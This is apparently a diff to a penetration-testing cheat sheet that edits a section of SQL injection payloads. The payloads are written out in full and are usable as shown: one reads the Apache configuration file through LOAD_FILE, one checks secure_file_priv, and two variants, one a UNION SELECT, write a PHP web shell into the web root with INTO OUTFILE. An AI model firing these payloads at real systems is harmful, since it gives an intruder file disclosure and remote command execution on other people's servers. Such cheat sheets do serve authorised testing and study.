@@ -61,13 +61,14 @@ After stuffing the input fields you should either obtain access to the system as
 # Grab web config info
 ' SELECT LOAD_FILE('/etc/httpd/conf/httpd.conf')--
 
-AND
+# AND
 
 ' SHOW VARIABLES LIKE 'secure_file_priv'--
+
 # Create webshell
 ' SELECT "<?php system($_GET['cmd']);?>" INTO OUTFILE "/var/www/html/<FILE>.php"--
 
-OR
+# OR
 
 ' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/<FILE>.php" --
 ```
